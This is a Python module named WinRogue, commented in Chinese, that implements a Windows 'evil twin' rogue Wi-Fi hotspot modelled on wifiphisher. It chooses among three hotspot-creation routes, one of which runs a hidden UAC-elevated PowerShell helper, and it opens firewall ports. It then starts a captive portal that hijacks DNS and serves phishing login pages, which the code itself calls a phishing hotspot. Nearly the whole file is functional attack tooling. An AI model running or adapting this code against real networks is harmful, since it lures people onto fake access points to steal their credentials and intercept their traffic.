# -*- coding: utf-8 -*-
"""
WinRogue —— Windows 邪恶孪生热点引擎（wifiphisher 的 Windows 对位实现）。

三条路径（服务本体免提权，按可用性自动选择）：
  1. hosted-direct（已是管理员）：netsh hostednetwork + 自管 DHCP/DNS/HTTP，零提示；
  2. hotspot（免管理员 · 零提示）：Windows 自带「移动热点」（WinRT），依赖网卡
     支持 WiFi Direct；DHCP/NAT 由系统 ICS 提供，门户只做 DNS 劫持 + HTTP 钓鱼页；
  3. hosted-uac（免管理员 · 一次 UAC 确认）：驱动只支持老承载网络时，启动/停止
     瞬间弹出 UAC，由临时提权的辅助脚本完成 netsh/防火墙/IP 配置；门户（绑定
     67/53/80 端口）仍在非提权的服务进程里运行（Windows 无低位端口限制）。

优先级：管理员→1；否则有 WiFi Direct→2；否则驱动支持承载网络→3。
"""
from __future__ import annotations

import json
import os
import re
import socket
import tempfile
import threading
import time

from . import portal as portal_mod
from .process import is_elevated, run_command

AP_IP = portal_mod.PORTAL_IP

HOTSPOT_PS1 = os.path.join(os.path.dirname(os.path.abspath(__file__)), "hotspot.ps1")
HOSTED_PS1 = os.path.join(os.path.dirname(os.path.abspath(__file__)), "hotspot_hosted.ps1")

# 移动热点探测结果缓存（避免每次能力查询都拉起 PowerShell）
_hotspot_cache = {"ts": 0.0, "data": None}
_hotspot_lock = threading.Lock()
_HOTSPOT_TTL = 30.0

# 防火墙规则统一前缀，便于清理
_RULE_PREFIX = "__pywifi_rogue__"
_RULES = [
    ("dhcp", "UDP", 67),
    ("dns", "UDP", 53),
    ("http", "TCP", 80),
]


def _netsh(*args) -> tuple[int, str]:
    return run_command(["netsh", "wlan", *args], timeout=20)


def _parse_ps_json(out: str) -> dict | None:
    """从 PowerShell 合并输出中提取最后一行 JSON。"""
    for line in reversed(out.strip().splitlines()):
        line = line.strip()
        if line.startswith("{"):
            try:
                return json.loads(line)
            except ValueError:
                return None
    return None


def _hotspot_action(action: str, ssid: str = "", key: str = "", timeout: float = 50) -> dict | None:
    argv = [
        "powershell", "-NoProfile", "-ExecutionPolicy", "Bypass",
        "-File", HOTSPOT_PS1, "-Action", action,
    ]
    if ssid:
        argv += ["-Ssid", ssid]
    if key:
        argv += ["-Passphrase", key]
    rc, out = run_command(argv, timeout=timeout)
    if rc != 0:
        return None
    return _parse_ps_json(out)


def hotspot_query(force: bool = False) -> dict | None:
    """查询移动热点能力/状态（带 30s 缓存）；不可控返回 None。"""
    with _hotspot_lock:
        now = time.time()
        if not force and _hotspot_cache["data"] is not None and now - _hotspot_cache["ts"] < _HOTSPOT_TTL:
            return _hotspot_cache["data"]
        data = _hotspot_action("status", timeout=20)
        if data and data.get("ok"):
            _hotspot_cache.update(ts=now, data=data)
            return data
        _hotspot_cache.update(ts=0.0, data=None)
        return None


def hotspot_available() -> bool:
    return hotspot_query() is not None


def _write_hosted_params(ssid: str, key: str) -> None:
    """把热点参数写给提权辅助脚本（避免命令行引号转义问题）。"""
    path = os.path.join(tempfile.gettempdir(), "pywifi_hosted_params.json")
    with open(path, "w", encoding="ascii") as f:
        json.dump({"ssid": ssid, "key": key}, f, ensure_ascii=True)


def _run_elevated_ps(ps1: str, action: str, timeout: float = 170) -> dict:
    """通过 UAC 临时提权运行辅助脚本（不改变服务自身权限）。

    UAC 取消/超时返回 ok=False；成功时读 %TEMP% 结果 JSON。
    """
    result_path = os.path.join(tempfile.gettempdir(), "pywifi_hosted_result.json")
    try:
        os.remove(result_path)
    except OSError:
        pass
    launcher = (
        'Start-Process powershell -Verb RunAs -Wait -WindowStyle Hidden '
        f'-ArgumentList \'-NoProfile -ExecutionPolicy Bypass -File "{ps1}" -Action {action}\''
    )
    rc, out = run_command(["powershell", "-NoProfile", "-Command", launcher], timeout=timeout)
    if os.path.exists(result_path):
        try:
            with open(result_path, "r", encoding="ascii", errors="ignore") as f:
                data = json.loads(f.read().strip())
                if data:
                    return data
        except ValueError:
            pass
    if rc != 0:
        low = out.lower()
        if "canceled by the user" in low or "被取消" in out or "denied" in low:
            return {"ok": False, "error": "管理员确认（UAC）被取消或超时"}
        return {"ok": False, "error": (out.strip().splitlines() or ["辅助脚本执行失败"])[-1][:200]}
    return {"ok": False, "error": "辅助脚本未返回结果（可能取消了 UAC 或超时）"}


def _wait_ip(ip: str, timeout: float = 12.0) -> bool:
    """等待本机获得指定 IP（热点网关就绪后再绑门户端口）。"""
    deadline = time.time() + timeout
    while time.time() < deadline:
        probe = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            probe.bind((ip, 0))
            return True
        except OSError:
            time.sleep(0.5)
        finally:
            probe.close()
    return False


def hosted_supported() -> tuple[bool, str]:
    """驱动是否支持承载网络（netsh wlan show drivers）。"""
    rc, out = run_command(["netsh", "wlan", "show", "drivers"], timeout=20)
    if rc != 0:
        return False, "无法读取网卡驱动信息"
    for line in out.splitlines():
        low = line.lower()
        if "hosted network supported" in low or "承载网络" in line and "支持" in line:
            val = line.split(":", 1)[-1].split("：", 1)[-1].strip().lower()
            if val in ("yes", "是"):
                return True, val
            return False, f"驱动不支持承载网络（{val or line.strip()}）"
    return False, "未在驱动信息中找到承载网络字段"


def hosted_status() -> dict:
    """当前承载网络状态（netsh wlan show hostednetwork）。"""
    rc, out = _netsh("show", "hostednetwork")
    info: dict = {"raw": {}}
    if rc != 0:
        return info
    for line in out.splitlines():
        for sep in (":", "："):
            if sep in line:
                k, v = line.split(sep, 1)
                info["raw"][k.strip().lower()] = v.strip()
                break
    status = ""
    for k, v in info["raw"].items():
        if "status" in k or "状态" in k:
            status = v
    info["status"] = status
    return info


def _find_hosted_adapter() -> str:
    """用 PowerShell 找承载虚拟网卡的连接名（如「本地连接* 10」）。"""
    ps = (
        "Get-NetAdapter | Where-Object { $_.InterfaceDescription -like '*Hosted Network*' } "
        "| Select-Object -First 1 -ExpandProperty Name"
    )
    rc, out = run_command(
        ["powershell", "-NoProfile", "-NonInteractive", "-Command", ps],
        timeout=20,
    )
    if rc == 0:
        name = out.strip().splitlines()
        if name:
            return name[-1].strip()
    return ""


def _firewall_add() -> None:
    for label, proto, port in _RULES:
        run_command(
            ["netsh", "advfirewall", "firewall", "add", "rule",
             f"name={_RULE_PREFIX}{label}", "dir=in", "action=allow",
             f"protocol={proto}", f"localport={port}", "enable=yes"],
            timeout=15,
        )


def _firewall_remove() -> None:
    for label, _proto, _port in _RULES:
        run_command(
            ["netsh", "advfirewall", "firewall", "delete", "rule",
             f"name={_RULE_PREFIX}{label}"],
            timeout=15,
        )


class WinRogueManager:
    def __init__(self):
        self._lock = threading.Lock()
        self.portal: portal_mod.CaptivePortal | None = None
        self.ssid = ""
        self.template = "wifi_login"
        self.adapter_name = ""
        self.mode = ""               # "hosted" / "hotspot"
        self.helper_elevated = False  # hosted 模式下是否经 UAC 辅助（停止时也需 UAC）

    def is_running(self) -> bool:
        return self.portal is not None

    def start(self, ssid: str, key: str, template: str = "wifi_login") -> dict:
        with self._lock:
            if self.portal is not None:
                raise RuntimeError("钓鱼热点已在运行，请先停止")
            if len(ssid) < 1 or len(ssid) > 32:
                raise ValueError("SSID 长度需在 1~32 之间")
            if len(key) < 8 or len(key) > 63:
                raise ValueError("热点密钥长度需在 8~63 之间")

            elevated = is_elevated()
            ok_hosted, why = hosted_supported()

            if elevated and ok_hosted:
                # ① 已是管理员：直接承载网络，零提示
                self._start_hosted_direct(ssid, key, template)
                self.mode, self.helper_elevated = "hosted", False
            else:
                hs = hotspot_query(force=True)
                if hs:
                    try:
                        # ② WiFi Direct 可用：免管理员移动热点，零提示
                        self._start_hotspot(ssid, key, template, elevated, why)
                        self.mode, self.helper_elevated = "hotspot", False
                    except Exception:
                        if not ok_hosted:
                            raise
                        # 移动热点失败但驱动支持承载网络 → 降级 ③
                        self._start_hosted_via_uac(ssid, key, template)
                        self.mode, self.helper_elevated = "hosted", True
                elif ok_hosted:
                    # ③ 只支持老承载网络：UAC 一次确认，服务本体不提权
                    self._start_hosted_via_uac(ssid, key, template)
                    self.mode, self.helper_elevated = "hosted", True
                else:
                    raise RuntimeError(
                        f"无法创建热点：驱动不支持承载网络（{why}），移动热点（WiFi Direct）也不可控")
            return self.status()

    def _start_portal(self, ssid: str, template: str, with_dhcp: bool) -> None:
        self.ssid = ssid
        self.template = template
        self.portal = portal_mod.CaptivePortal(ssid, template, AP_IP, with_dhcp=with_dhcp)
        try:
            self.portal.start()
        except Exception:
            self.portal = None
            raise

    def _start_hosted_direct(self, ssid: str, key: str, template: str) -> None:
        # 1) 配置 + 启动承载网络
        rc, out = _netsh("set", "hostednetwork", "mode=allow",
                         f"ssid={ssid}", f"key={key}", "keyUsage=persistent")
        if rc != 0:
            raise RuntimeError(f"配置承载网络失败：{out.strip()}")
        rc, out = _netsh("start", "hostednetwork")
        if rc != 0:
            raise RuntimeError(f"启动承载网络失败：{out.strip()}（可能被占用或被策略禁用）")

        # 2) 找虚拟网卡并设静态 IP
        self.adapter_name = _find_hosted_adapter()
        if self.adapter_name:
            run_command(
                ["netsh", "interface", "ip", "set", "address",
                 f"name={self.adapter_name}", "static", AP_IP,
                 "255.255.255.0"],
                timeout=15,
            )

        # 3) 防火墙
        _firewall_add()

        # 4) 启动门户（DHCP/DNS/HTTP 全自管）
        try:
            self._start_portal(ssid, template, with_dhcp=True)
        except Exception:
            self._teardown_hotspot()
            raise

    def _start_hosted_via_uac(self, ssid: str, key: str, template: str) -> None:
        """免管理员 + 仅老承载网络：弹一次 UAC，由辅助脚本完成 netsh/防火墙/IP。"""
        _write_hosted_params(ssid, key)
        res = _run_elevated_ps(HOSTED_PS1, "start")
        if not res.get("ok"):
            raise RuntimeError(f"承载网络启动失败：{res.get('error') or '未知错误'}")
        if not _wait_ip(AP_IP, 12):
            raise RuntimeError(f"热点已启动但网关 {AP_IP} 未就绪")
        self.adapter_name = _find_hosted_adapter()
        # 门户在本进程绑定 67/53/80 —— Windows 普通用户即可
        self._start_portal(ssid, template, with_dhcp=True)

    def _start_hotspot(self, ssid: str, key: str, template: str,
                       elevated: bool, hosted_why: str) -> None:
        hs = hotspot_query(force=True)
        if not hs:
            hint = "需以管理员运行" if not elevated else f"驱动不支持承载网络（{hosted_why}）"
            raise PermissionError(
                f"免管理员的移动热点不可用（无网络连接档案或系统限制），且{hint}，无法创建热点")
        res = _hotspot_action("start", ssid, key, timeout=50)
        if not res or not res.get("ok"):
            detail = (res or {}).get("status") or (res or {}).get("error") or "未知错误"
            extra = (res or {}).get("extra") or ""
            if detail == "WiFiDeviceOff":
                detail += "（多为网卡不支持 WiFi Direct，移动热点用不了）"
            raise RuntimeError(
                f"移动热点启动失败：{detail}{' · ' + extra if extra else ''}"
                f"（免管理员模式依赖 Windows 移动热点）")
        if not _wait_ip(AP_IP, 12):
            self._hotspot_off()
            raise RuntimeError(f"热点已启动但网关 {AP_IP} 未就绪")

        # DHCP/NAT 由系统 ICS 提供，门户只接管 DNS + HTTP
        self._start_portal(ssid, template, with_dhcp=False)

    def _hotspot_off(self) -> None:
        try:
            _hotspot_action("stop", timeout=30)
        except Exception:  # noqa: BLE001
            pass

    def stop(self) -> dict:
        with self._lock:
            if self.portal is None:
                return {"running": False}
            try:
                self.portal.stop()
            finally:
                self.portal = None
                if self.mode == "hotspot":
                    self._hotspot_off()
                elif self.helper_elevated:
                    _run_elevated_ps(HOSTED_PS1, "stop")  # 停止同样弹一次 UAC
                else:
                    self._teardown_hotspot()
                self.mode, self.helper_elevated = "", False
            return {"running": False}

    def _teardown_hotspot(self) -> None:
        _firewall_remove()
        if self.adapter_name:
            run_command(
                ["netsh", "interface", "ip", "set", "address",
                 f"name={self.adapter_name}", "dhcp"],
                timeout=15,
            )
        _netsh("stop", "hostednetwork")
        self.adapter_name = ""

    def status(self) -> dict:
        if self.portal is None:
            base = {"running": False, "mode": "", **hosted_status()}
            hs = hotspot_query()
            if hs and hs.get("state") == "On":
                # 服务重启后热点仍在运行（上次会话遗留）
                base["hotspot_on"] = True
                base["hotspot_ssid"] = hs.get("ssid", "")
            return base
        st = self.portal.status()
        st["running"] = True
        st["mode"] = self.mode
        st["adapter_name"] = self.adapter_name
        return st


# 模块级单例
manager = WinRogueManager()
